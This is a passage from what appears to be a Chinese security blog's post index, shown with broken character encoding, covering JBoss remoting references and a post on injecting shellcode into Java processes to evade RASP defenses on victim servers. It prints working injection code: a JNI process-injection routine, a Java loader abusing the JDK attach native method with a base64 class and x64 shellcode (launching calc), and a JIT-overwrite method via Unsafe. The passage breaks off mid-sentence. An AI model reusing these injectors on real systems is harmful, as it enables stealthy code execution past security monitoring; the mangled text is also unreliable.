7.xåŠå¾€åç‰ˆæœ¬ï¼ŒJBoss/Wildflyå·²é»˜è®¤ä¸ä½¿ç”¨remoting2åè®®ï¼Œè€Œæ˜¯ä½¿ç”¨äº†å¼•å…¥èº«ä»½è®¤è¯æœºåˆ¶çš„remoting3åè®®ã€‚æ„Ÿè§‰remoting3åè®®å¯åˆ†æçœ‹çœ‹ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæ¼æ´ï¼Œä½†æœ€å‘çš„æ˜¯è¿™ä¹ˆå¤šå¹´è¿‡å»äº†ï¼Œremoting3ç«Ÿç„¶è¿ä»½æ–‡æ¡£éƒ½æ²¡æœ‰ã€‚ã€‚ã€‚ æ–‡ä¸­è‹¥æœ‰ä»€ä¹ˆé”™è¯¯çš„åœ°æ–¹ï¼Œæ³è¯·å„ä½å¸ˆå‚…æ–§æ­£ã€‚ å‚è€ƒhttps://docs.jboss.org/jbossremoting/2.5.4.SP5/guide/html_single/ https://docs.jboss.org/jbossremoting/2.5.4.SP5/userguide/html_single/ https://y4er.com/post/jboss-4446-rce-and-rpc-echo-response/ https://www.tenable.com/security/research/tra-2016-22","link":"/2022/06/02/JBoss remoting2åè®®åŠå…¶ååºåˆ—åŒ–åˆ†æ/"},{"title":"JVM Shellcodeæ³¨å…¥æ¢ç´¢","text":"å‰è¨€éšç€RASPæŠ€æœ¯çš„å‘å±•ï¼Œæ™®é€šwebshellå·²ç»å¾ˆéš¾æœ‰ç”¨æ­¦ä¹‹åœ°ï¼Œç”šè‡³æ˜¯å„ç§å†…å­˜é©¬ä¹Ÿé€æ¸æ‰è¥Ÿè§è‚˜ã€‚ç§‰æ‰¿ç€ã€ŠJSP Webshellé‚£äº›äº‹â€”â€”æ”»å‡»ç¯‡ï¼ˆä¸Šï¼‰ã€‹ä¸­å‘ä¸‹èµ°çš„æ€è·¯ï¼Œå­˜ä¸å­˜åœ¨ä¸€ç§åœ¨Javaä»£ç ä¸­æ‰§è¡Œæœºå™¨ç çš„æ–¹æ³•å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œå¸¸è§çš„æ³¨å…¥æ–¹å¼æœ‰JNIã€JNAå’Œåˆ©ç”¨JDKè‡ªå¸¦çš„Nativeæ–¹æ³•ç­‰ï¼Œå…¶ä¸­ç¬”è€…è¿˜æ‰¾åˆ°äº†ä¸€ç§é²œæœ‰æ–‡ç« ä»‹ç»çš„ï¼ŒåŸºäºHotSpotè™šæ‹Ÿæœºï¼Œä¸”è¾ƒä¸ºé€šç”¨çš„æ³¨å…¥æ–¹æ³•ã€‚ åŸºäºJNIJavaåº•å±‚è™½ç„¶æ˜¯C/C++å®ç°çš„ï¼Œä½†ä¸èƒ½ç›´æ¥æ‰§è¡ŒC/C++ä»£ç ã€‚è‹¥æƒ³è¦æ‰§è¡ŒC/C++çš„ä»£ç ï¼Œä¸€èˆ¬å¾—é€šè¿‡JNIï¼Œå³Javaæœ¬åœ°è°ƒç”¨ï¼ˆJava Native Interfaceï¼‰ï¼ŒåŠ è½½JNIé“¾æ¥åº“ï¼Œè°ƒç”¨Nativeæ–¹æ³•å®ç°ã€‚ Cobalt Strikeå®˜ç½‘åšå®¢ä¸Šæœ‰ä¸€ç¯‡ã€Šå¦‚ä½•ä»Javaæ³¨å…¥shellcodeã€‹çš„æ–‡ç« ï¼Œä¾¿æ˜¯åŸºäºJNIå®ç°ï¼Œé€šè¿‡Nativeæ–¹æ³•è°ƒç”¨C/C++ä»£ç å°†shellcodeæ³¨å…¥åˆ°å†…å­˜ä¸­ã€‚ 1234567//C/C++ä»£ç ä¸­å£°æ˜çš„å‡½æ•°å¯¹åº”Demo#injectæœ¬åœ°æ–¹æ³•JNIEXPORT void JNICALL Java_Demo_inject(JNIEnv * env, jobject object, jbyteArray jdata) { jbyte * data = (*env)-&gt;GetByteArrayElements(env, jdata, 0); jsize length = (*env)-&gt;GetArrayLength(env, jdata); inject((LPCVOID)data, (SIZE_T)length); (*env)-&gt;ReleaseByteArrayElements(env, jdata, data, 0);} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//æ‰§è¡Œæ³¨å…¥shellcodeçš„ä»£ç /* inject some shellcode... enclosed stuff is the shellcode y0 */void inject(LPCVOID buffer, int length) { STARTUPINFO si; PROCESS_INFORMATION pi; HANDLE hProcess = NULL; SIZE_T wrote; LPVOID ptr; char lbuffer[1024]; char cmdbuff[1024]; /* reset some stuff */ ZeroMemory( &amp;si, sizeof(si) ); si.cb = sizeof(si); ZeroMemory( &amp;pi, sizeof(pi) ); /* start a process */ GetStartupInfo(&amp;si); si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; si.hStdOutput = NULL; si.hStdError = NULL; si.hStdInput = NULL; /* resolve windir? */ GetEnvironmentVariableA(\"windir\", lbuffer, 1024); /* setup our path... choose wisely for 32bit and 64bit platforms */ #ifdef _IS64_ _snprintf(cmdbuff, 1024, \"%s\\\\SysWOW64\\\\notepad.exe\", lbuffer); #else _snprintf(cmdbuff, 1024, \"%s\\\\System32\\\\notepad.exe\", lbuffer); #endif /* spawn the process, baby! */ if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &amp;si, &amp;pi)) return; hProcess = pi.hProcess; if( !hProcess ) return; /* allocate memory in our process */ ptr = (LPVOID)VirtualAllocEx(hProcess, 0, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); /* write our shellcode to the process */ WriteProcessMemory(hProcess, ptr, buffer, (SIZE_T)length, (SIZE_T *)&amp;wrote); if (wrote != length) return; /* create a thread in the process */ CreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);} è¿™ç§æ–¹æ³•éœ€è¦è‡ªè¡Œç¼–å†™ä¸ªé“¾æ¥åº“ï¼Œå¹¶ä¸Šä¼ åˆ°å—å®³æœåŠ¡å™¨ä¸Šï¼Œåˆ©ç”¨èµ·æ¥å¹¶ä¸æ˜¾å¾—ä¼˜é›…ã€‚ è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•æ˜¯åˆ©ç”¨JNAç¬¬ä¸‰æ–¹åº“ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨å†…æ ¸çš„å‡½æ•°ï¼Œå®ç°Shellcodeæ³¨å…¥ã€‚åœ¨@yzddmr6å¸ˆå‚…çš„Java-Shellcode-Loaderé¡¹ç›®ä¸­æœ‰å®ç°ï¼Œä½†JNAæœ¬è´¨ä¸Šè¿˜æ˜¯åŸºäºJNIï¼Œä½¿ç”¨æ—¶è¿˜æ˜¯è¦åŠ è½½JNAè‡ªå·±çš„é“¾æ¥åº“ï¼Œå¹¶ä¸”JDKä¸­é»˜è®¤ä¸åŒ…å«JNAè¿™ä¸ªç±»åº“ï¼Œä½¿ç”¨æ—¶éœ€è¦æƒ³åŠæ³•å¼•å…¥ã€‚ åŸºäºJDKè‡ªå¸¦çš„Nativeæ–¹æ³•ç¬¬ä¸€ä¸ªä»‹ç»çš„å¯èƒ½æ˜¯å†°èçš„ä½œè€…@rebeyondå¸ˆå‚…é¦–å…ˆå‘ç°çš„æ–¹æ³•ï¼Œä¸€ç§åŸºäºJDKè‡ªå¸¦çš„Nativeæ–¹æ³•çš„shellcodeæ³¨å…¥ï¼Œä¸¥æ ¼æ¥è¯´æ˜¯åŸºäºHotSpotè™šæ‹Ÿæœºçš„JDKçš„è‡ªå¸¦Nativeæ–¹æ³•ã€‚å®ƒæ˜¯sun/tools/attach/VirtualMachineImpl#enqueueNativeæ–¹æ³•ï¼Œå­˜åœ¨äºç”¨äºattach Javaè¿›ç¨‹çš„tools.jaråŒ…ä¸­ã€‚ å½“è¿è¡Œåœ¨Windowsä¸Šæ—¶ï¼Œç›¸åº”çš„enqueue Nativeæ–¹æ³•å®ç°åœ¨/src/jdk.attach/windows/native/libattach/VirtualMachineImpl.cä¸­ï¼Œå…¶ä¸­Create thread in target process to execute codeçš„æ“ä½œï¼Œä¸èƒ½è¯´è·Ÿå‰é¢Cobalt Strikeæ³¨å…¥shellcodeçš„æ“ä½œæ¯«ä¸ç›¸å¹²ï¼Œåªèƒ½è¯´æ˜¯ä¸€æ¨¡ä¸€æ ·ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546JNIEXPORT void JNICALL Java_sun_tools_attach_VirtualMachineImpl_enqueue (JNIEnv *env, jclass cls, jlong handle, jbyteArray stub, jstring cmd, jstring pipename, jobjectArray args){ ... /* * Allocate memory in target process for data and code stub * (assumed aligned and matches architecture of target process) */ hProcess = (HANDLE)handle; pData = (DataBlock*) VirtualAllocEx( hProcess, 0, sizeof(DataBlock), MEM_COMMIT, PAGE_READWRITE ); if (pData == NULL) { JNU_ThrowIOExceptionWithLastError(env, \"VirtualAllocEx failed\"); return; } WriteProcessMemory( hProcess, (LPVOID)pData, (LPCVOID)&amp;data, (SIZE_T)sizeof(DataBlock), NULL ); stubLen = (DWORD)(*env)-&gt;GetArrayLength(env, stub); stubCode = (*env)-&gt;GetByteArrayElements(env, stub, &amp;isCopy); if ((*env)-&gt;ExceptionOccurred(env)) return; pCode = (PDWORD) VirtualAllocEx( hProcess, 0, stubLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE ); if (pCode == NULL) { JNU_ThrowIOExceptionWithLastError(env, \"VirtualAllocEx failed\"); VirtualFreeEx(hProcess, pData, 0, MEM_RELEASE); (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT); return; } WriteProcessMemory( hProcess, (LPVOID)pCode, (LPCVOID)stubCode, (SIZE_T)stubLen, NULL ); (*env)-&gt;ReleaseByteArrayElements(env, stub, stubCode, JNI_ABORT); /* * Create thread in target process to execute code */ hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) pCode, pData, 0, NULL ); ...} å½“ç„¶ä½ ä¸èƒ½è¯´è¿™ä¸ªæ˜¯bugï¼Œåªèƒ½è¯´æ˜¯featureã€‚ ç›¸åº”çš„Demoæ˜¯æ¯”è¾ƒç®€å•ï¼Œåœ¨stubå‚æ•°ä¸­ä¼ å…¥shellcodeå³å¯ï¼Œ@rebeyondå¸ˆå‚…å·²ç»ç»™å‡ºäº†ä»£ç ï¼Œç¬”è€…åœ¨è¿™é‡Œåšäº†ç‚¹ç®€åŒ–ã€‚ä¸è¿‡å®ç°Nativeæ–¹æ³•çš„é“¾æ¥åº“attach.dllé»˜è®¤å­˜åœ¨ï¼Œä½†tools.jarè¿™ä¸ªåŒ…ä¸ä¸€å®šå­˜åœ¨ï¼Œ@rebeyondå¸ˆå‚…å·§å¦™çš„åˆ©ç”¨äº†åŒäº²å§”æ´¾æœºåˆ¶ï¼Œå½“JVMä¸­æ²¡æœ‰åŠ è½½VirtualMachineImplç±»æ—¶ï¼Œå°±ä¼šä½¿ç”¨ä¸‹é¢base64ç¼–ç çš„ç±»æ›¿ä»£ã€‚å½“ç„¶è¿™ç§æ–¹æ³•ä»…é€‚ç”¨äºWindowsï¼Œå› ä¸ºLinuxä¸‹enqueueå¹¶ä¸æ˜¯è¿™ä¹ˆå®ç°çš„ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546import java.io.ByteArrayOutputStream;import java.lang.reflect.Method;import java.util.Base64;public class WindowsAgentShellcodeLoader { public static void main(String[] args) { try { String classStr = \"yv66vgAAADQAMgoABwAjCAAkCgAlACYF//////////8IACcHACgKAAsAKQcAKgoACQArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAChMc3VuL3Rvb2xzL2F0dGFjaC9XaW5kb3dzVmlydHVhbE1hY2hpbmU7AQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAApFeGNlcHRpb25zBwAtAQALb3BlblByb2Nlc3MBAAQoSSlKAQADcnVuAQAFKFtCKVYBAAR2YXIyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADYnVmAQACW0IBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAMAA0BAAZhdHRhY2gHAC4MAC8AMAEABHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0DAATABQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAxAA0BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UAIQALAAcAAAAAAAQAAQAMAA0AAQAOAAAAMwABAAEAAAAFKrcAAbEAAAACAA8AAAAKAAIAAAAGAAQABwAQAAAADAABAAAABQARABIAAAGIABMAFAABABUAAAAEAAEAFgEIABcAGAABABUAAAAEAAEAFgAJABkAGgABAA4AAAB6AAYAAgAAAB0SArgAAxQABCoSBhIGA70AB7gACKcACEwrtgAKsQABAAUAFAAXAAkAAwAPAAAAGgAGAAAADgAFABAAFAATABcAEQAYABIAHAAVABAAAAAWAAIAGAAEABsAHAABAAAAHQAdAB4AAAAfAAAABwACVwcAIAQAAQAhAAAAAgAi\"; Class clazz = new MyClassLoader().get(Base64.getDecoder().decode(classStr)); byte buf[] = new byte[]{ (byte) 0xFC, (byte) 0x48, (byte) 0x83, (byte) 0xE4, (byte) 0xF0, (byte) 0xE8, (byte) 0xC0, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51, (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xD2, (byte) 0x65, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x60, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x20, (byte) 0x48, (byte) 0x8B, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0F, (byte) 0xB7, (byte) 0x4A, (byte) 0x4A, (byte) 0x4D, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0x31, (byte) 0xC0, (byte) 0xAC, (byte) 0x3C, (byte) 0x61, (byte) 0x7C, (byte) 0x02, (byte) 0x2C, (byte) 0x20, (byte) 0x41, (byte) 0xC1, (byte) 0xC9, (byte) 0x0D, (byte) 0x41, (byte) 0x01, (byte) 0xC1, (byte) 0xE2, (byte) 0xED, (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8B, (byte) 0x52, (byte) 0x20, (byte) 0x8B, (byte) 0x42, (byte) 0x3C, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x8B, (byte) 0x80, (byte) 0x88, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xC0, (byte) 0x74, (byte) 0x67, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x50, (byte) 0x8B, (byte) 0x48, (byte) 0x18, (byte) 0x44, (byte) 0x8B, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0xE3, (byte) 0x56, (byte) 0x48, (byte) 0xFF, (byte) 0xC9, (byte) 0x41, (byte) 0x8B, (byte) 0x34, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xD6, (byte) 0x4D, (byte) 0x31, (byte) 0xC9, (byte) 0x48, (byte) 0x31, (byte) 0xC0, (byte) 0xAC, (byte) 0x41, (byte) 0xC1, (byte) 0xC9, (byte) 0x0D, (byte) 0x41, (byte) 0x01, (byte) 0xC1, (byte) 0x38, (byte) 0xE0, (byte) 0x75, (byte) 0xF1, (byte) 0x4C, (byte) 0x03, (byte) 0x4C, (byte) 0x24, (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xD1, (byte) 0x75, (byte) 0xD8, (byte) 0x58, (byte) 0x44, (byte) 0x8B, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0x66, (byte) 0x41, (byte) 0x8B, (byte) 0x0C, (byte) 0x48, (byte) 0x44, (byte) 0x8B, (byte) 0x40, (byte) 0x1C, (byte) 0x49, (byte) 0x01, (byte) 0xD0, (byte) 0x41, (byte) 0x8B, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01, (byte) 0xD0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5E, (byte) 0x59, (byte) 0x5A, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5A, (byte) 0x48, (byte) 0x83, (byte) 0xEC, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xFF, (byte) 0xE0, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x5A, (byte) 0x48, (byte) 0x8B, (byte) 0x12, (byte) 0xE9, (byte) 0x57, (byte) 0xFF, (byte) 0xFF, (byte) 0xFF, (byte) 0x5D, (byte) 0x48, (byte) 0xBA, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8D, (byte) 0x8D, (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xBA, (byte) 0x31, (byte) 0x8B, (byte) 0x6F, (byte) 0x87, (byte) 0xFF, (byte) 0xD5, (byte) 0xBB, (byte) 0xF0, (byte) 0xB5, (byte) 0xA2, (byte) 0x56, (byte) 0x41, (byte) 0xBA, (byte) 0xA6, (byte) 0x95, (byte) 0xBD, (byte) 0x9D, (byte) 0xFF, (byte) 0xD5, (byte) 0x48, (byte) 0x83, (byte) 0xC4, (byte) 0x28, (byte) 0x3C, (byte) 0x06, (byte) 0x7C, (byte) 0x0A, (byte) 0x80, (byte) 0xFB, (byte) 0xE0, (byte) 0x75, (byte) 0x05, (byte) 0xBB, (byte) 0x47, (byte) 0x13, (byte) 0x72, (byte) 0x6F, (byte) 0x6A, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89, (byte) 0xDA, (byte) 0xFF, (byte) 0xD5 }; ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byteArrayOutputStream.write(buf); byteArrayOutputStream.write(\"calc\\0\".getBytes()); byte[] result = byteArrayOutputStream.toByteArray(); Method method = clazz.getDeclaredMethod(\"run\", byte[].class); method.invoke(clazz, result); } catch (Exception e) { e.printStackTrace(); } } public static class MyClassLoader extends ClassLoader { public Class get(byte[] bytes) { return super.defineClass(bytes, 0, bytes.length); } }} 12345678910111213141516171819202122package sun.tools.attach;import java.io.IOException;public class WindowsVirtualMachine { public WindowsVirtualMachine() { } static native void enqueue(long var0, byte[] var2, String var3, String var4, Object... var5) throws IOException; static native long openProcess(int var0) throws IOException; public static void run(byte[] buf) { System.loadLibrary(\"attach\"); try { enqueue(-1L, buf, \"test\", \"test\"); } catch (Exception var2) { var2.printStackTrace(); } }} åŸºäºoopåç§»è¿™ç§æ˜¯åŸºäº@Ryan Winceyå’Œ@xxDarkä¸¤ä½å‰è¾ˆçš„æ€»ç»“ï¼ŒåŸºæœ¬åŸç†æ˜¯ï¼šå¤šæ¬¡è°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œä½¿å…¶æˆä¸ºçƒ­ç‚¹ä»£ç è§¦å‘å³æ—¶ç¼–è¯‘ï¼Œç„¶åé€šè¿‡oopçš„æ•°æ®ç»“æ„åç§»è®¡ç®—å‡ºJITåœ°å€ï¼Œæœ€åä½¿ç”¨Unsafeå†™å†…å­˜çš„åŠŸèƒ½ï¼Œå°†shellcodeå†™å…¥åˆ°JITåœ°å€ã€‚å…¶ä¸­æ¶‰åŠUnsafeã€Oop-Klassæ¨¡å‹å’Œå³æ—¶ç¼–è¯‘è¿™ä¸‰ä¸ªå‰ç½®çŸ¥è¯†ã€‚ Unsafeç±»Unsafeç±»æ˜¯javaä¸­éå¸¸ç‰¹åˆ«çš„ä¸€ä¸ªç±»ï¼Œæä¾›çš„æ“ä½œå¯ä»¥ç›´æ¥è¯»å†™å†…å­˜ã€è·å¾—åœ°å€åç§»å€¼ã€é”å®šæˆ–é‡Šæ”¾çº¿ç¨‹ã€‚Unsafeåªæœ‰ä¸€ä¸ªç§æœ‰çš„æ„é€ æ–¹æ³•ï¼Œä½†åœ¨ç±»åŠ è½½æ—¶å€™åœ¨é™æ€ä»£ç ä¸­ä¼šå®ä¾‹åŒ–ä¸€ä¸ªUnsafeå¯¹è±¡ï¼Œèµ‹å€¼ç»™Unsafeç±»çš„é™æ€å¸¸é‡Unsafeå±æ€§ï¼Œæˆ‘ä»¬åå°„è·å–åˆ°è¿™ä¸ªUnsafeå±æ€§å³å¯ã€‚ 123Field field = Unsafe.class.getDeclaredField(\"theUnsafe\");field.setAccessible(true);Unsafe unsafe = (Unsafe) field.get(null); Unsafeè¯»å†™å†…å­˜çš„ç›¸å…³æ–¹æ³•æœ‰getObjectã€getAddressã€getIntã€getLongå’ŒputByteç­‰ã€‚ Oop-Klassæ¨¡å‹HotSpot JVM åº•å±‚éƒ½æ˜¯ C/C++ å®ç°çš„ï¼ŒJava å¯¹è±¡åœ¨JVMçš„è¡¨ç¤ºæ¨¡å‹å«åšâ€œOOP-Klassâ€æ¨¡å‹ï¼ŒåŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼š OOPï¼Œå³ Ordinary Object Pointï¼Œæ™®é€šå¯¹è±¡æŒ‡é’ˆï¼Œç”¨æ¥æè¿°å¯¹è±¡å®ä¾‹ä¿¡æ¯ã€‚ Klassï¼Œç”¨æ¥æè¿° Java ç±»ï¼ŒåŒ…å«äº†å…ƒæ•°æ®å’Œæ–¹æ³•ä¿¡æ¯ç­‰ã€‚ åœ¨Javaç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œæ¯åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ï¼Œåœ¨JVMå†…éƒ¨å°±ä¼šç›¸åº”åœ°åˆ›å»ºä¸€ä¸ªå¯¹åº”ç±»å‹çš„OOPå¯¹è±¡ã€‚Javaç±»æ˜¯å¯¹è±¡ï¼ŒJavaæ–¹æ³•ä¹Ÿæ˜¯å¯¹è±¡ï¼Œè€ŒJavaç±»åŠ è½½å®Œæˆæ—¶åœ¨JVMä¸­çš„æœ€ç»ˆäº§ç‰©å°±æ˜¯InstanceKlassï¼Œå…¶ä¸­åŒ…å«æ–¹æ³•ä¿¡æ¯ã€å­—æ®µä¿¡æ¯ç­‰ä¸€åˆ‡java ç±»æ‰€å®šä¹‰çš„ä¸€åˆ‡å…ƒç´ ã€‚ å³æ—¶ç¼–è¯‘ï¼ˆJITï¼‰ ä¸ºäº†ä¼˜åŒ–Javaçš„æ€§èƒ½ ï¼ŒJVMåœ¨è§£é‡Šå™¨ä¹‹å¤–å¼•å…¥äº†å³æ—¶ï¼ˆJust In Timeï¼‰ç¼–è¯‘å™¨ï¼šå½“ç¨‹åºè¿è¡Œæ—¶ï¼Œè§£é‡Šå™¨é¦–å…ˆå‘æŒ¥ä½œç”¨ï¼Œä»£ç å¯ä»¥ç›´æ¥æ‰§è¡Œï¼›å½“æ–¹æ³•æˆ–è€…ä»£ç å—åœ¨ä¸€æ®µæ—¶é—´å†…çš„è°ƒç”¨æ¬¡æ•°è¶…è¿‡äº†JVMè®¾å®šçš„é˜ˆå€¼æ—¶ï¼Œè¿™äº›å­—èŠ‚ç å°±ä¼šè¢«ç¼–è¯‘æˆæœºå™¨ç ï¼Œå­˜å…¥codeCacheä¸­ã€‚åœ¨ä¸‹æ¬¡æ‰§è¡Œæ—¶ï¼Œå†é‡åˆ°è¿™æ®µä»£ç ï¼Œå°±ä¼šä»codeCacheä¸­è¯»å–æœºå™¨ç ï¼Œç›´æ¥æ‰§è¡Œï¼Œä»¥æ­¤æ¥æå‡ç¨‹åºè¿è¡Œçš„æ€§èƒ½ã€‚æ•´ä½“çš„æ‰§è¡Œè¿‡ç¨‹å¤§è‡´å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š Openjdkå’ŒOracle JDKåœ¨é»˜è®¤mixedæ¨¡å¼ä¸‹ä¼šå¯åŠ¨å³æ—¶ç¼–è¯‘ï¼Œå³æ—¶ç¼–è¯‘çš„è§¦å‘é˜ˆå€¼åœ¨å®¢æˆ·ç«¯ç¼–è¯‘å™¨å’ŒæœåŠ¡ç«¯ç¼–è¯‘å™¨ä¸Šé»˜è®¤å€¼åˆ†åˆ«ä¸º1500å’Œ10000ã€‚ åŸç†åˆ†æåœ¨JVMçš„æœ¬ä½“ï¼šjvm.dllå’Œlibjvm.soä¸­ï¼Œå­˜åœ¨è¿™ä¸€ä¸ªVMStructsçš„ç±»ï¼Œå­˜å‚¨äº†JVMä¸­åŒ…æ‹¬oopã€klassã€constantPoolåœ¨å†…çš„æ•°æ®ç»“æ„å’Œä»–çš„å±æ€§ã€‚å…¶ä¸­æœ‰ä½¿ç”¨JNIEXPORTæ ‡è®°çš„VMStructsã€VMTypesã€IntConstantså’ŒLongConstantsçš„å…¥å£ã€åç§°ã€åœ°å€ç­‰åç§»çš„å˜é‡ï¼Œå€ŸåŠ©ClassLoaderçš„å†…éƒ¨ç±»NativeLibraryçš„findæˆ–findEntryNativeæ–¹æ³•ï¼ˆä¸JDKçš„ç‰ˆæœ¬æœ‰å…³ï¼‰,å¯è·å–åˆ°è¿™äº›å˜é‡çš„å€¼ã€‚ ç„¶åé€šè¿‡InstanceKlassã€Array&lt;Method*&gt;ã€Methodã€ConstMethodã€ConstantPoolã€Symbolè¿™äº›oopæ•°æ®ç»“æ„ä¸­çš„å˜é‡åç§»è®¡ç®—å‡ºJITçš„åœ°å€ã€‚ æˆ‘ä»¬è¦è®¡ç®—å‡ºçš„ç›®æ ‡JITåœ°å€æ˜¯ç›®æ ‡æ–¹æ³•çš„JITåœ°å€ï¼Œè¿™éœ€è¦ç›®æ ‡æ–¹æ³•ç»å¤šæ¬¡è°ƒç”¨è§¦å‘å³æ—¶ç¼–è¯‘ï¼Œå¹¶è‡ªåŠ¨èµ‹å€¼_from_compiled_entryç»“æ„æˆå‘˜ï¼Œç„¶åå¯¹æ¯”æ–¹æ³•åå’ŒSignatureï¼Œä»ç›®æ ‡ç±»ä¼—å¤šé»˜è®¤æ–¹æ³•ä¸­è¿‡æ»¤å‡ºç›®æ ‡æ–¹æ³•æ¥ï¼Œå†é€šè¿‡MethodåŠ ä¸Š_from_compiled_entryåç§»è®¡ç®—å‡ºæ¥ã€‚ï¼ˆè¿™é‡Œçš„Signatureå³å½¢å¦‚()Vã€(Ljava/lang/String;)Vã€()Ljava/lang/String;çš„æ–¹æ³•ç­¾åï¼‰ ä¸Šå›¾æ²¡æœ‰æåˆ°InstanceKlassçš„è·å–ï¼Œå…¶å®åªè¦é€šè¿‡Target.classè·å–åˆ°ç›®æ ‡ç±»çš„ç±»å®ä¾‹ï¼Œå†ç”¨Unsafeè¯»å–ç±»å®ä¾‹åŠ ä¸Šjava_lang_Classçš„klassåç§»å³å¯ã€‚ JVMçš„JITåœ¨å†…å­˜ä¸­æ˜¯ä¸€ä¸ªå¯è¯»å¯å†™å¯æ‰§è¡Œçš„åŒºåŸŸï¼Œæœ€åä½¿ç”¨Unsafeçš„putByteæ–¹æ³•å†™å…¥shellcodeï¼Œå†è°ƒç”¨ç›®æ ‡æ–¹æ³•å³å¯æ‰§è¡Œã€‚è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½¿ç”¨æ²¡æœ‰æ¢å¤ç°åœºï¼Œå³ç ´åäº†åŸæœ‰æ ˆå¸§çš„shellcodeï¼Œä¼šå¯¼è‡´JVMå¥”æºƒï¼Œåˆ‡å‹¿åœ¨ç”Ÿäº§ç¯å¢ƒä¸Šæµ‹è¯•ã€‚ ä»¥ä¸Šçš„Demoä»£ç å¯ä»¥@xxDarkçš„ JavaShellcodeInjectoré¡¹ç›®ä¸­æµè§ˆã€‚ éƒ¨åˆ†é—®é¢˜ä¿®å¤åŠæ”¹è¿›åœ¨32ä½çš„JDKè·‘Demoï¼ŒJREä¼šæŠ›å‡ºä¸ªå¼‚å¸¸ï¼Œè°ƒè¯•å‘ç°ä»ç›®æ ‡ç±»å®ä¾‹è·å–InstanceKlassçš„åç§»ï¼šklassOffsetï¼Œä»å†…å­˜å–åˆ°çš„å€¼æ˜¯0ï¼Œä½¿å¾—è·å–åˆ°çš„klassä¸æ­£ç¡®ï¼Œå¯¼è‡´Unsafeè¯»å–äº†ä¸€ä¸ªå¼‚å¸¸çš„åœ°å€ã€‚ é—®é¢˜çš„åŸå› ç›®å‰è¿˜ä¸å¾—è€ŒçŸ¥ï¼Œä½†é€šè¿‡HSDBæ‰¾åˆ°java.lang.Classçš„InstanceKlasså°±å¯ä»¥çœ‹åˆ°klassçš„åç§»ï¼Œåç»­å…¶ä»–è‡ªåŠ¨è·å–çš„åç§»ä¹Ÿæ²¡æœ‰å‡ºç°å¼‚å¸¸ã€‚ ä¸Šé¢è‡ªåŠ¨åŒ–åœ°è®¡ç®—åç§»ï¼Œè¦åŠ è½½JVMçš„é“¾æ¥åº“ï¼Œè¿˜è¦è·å–ä¸€å 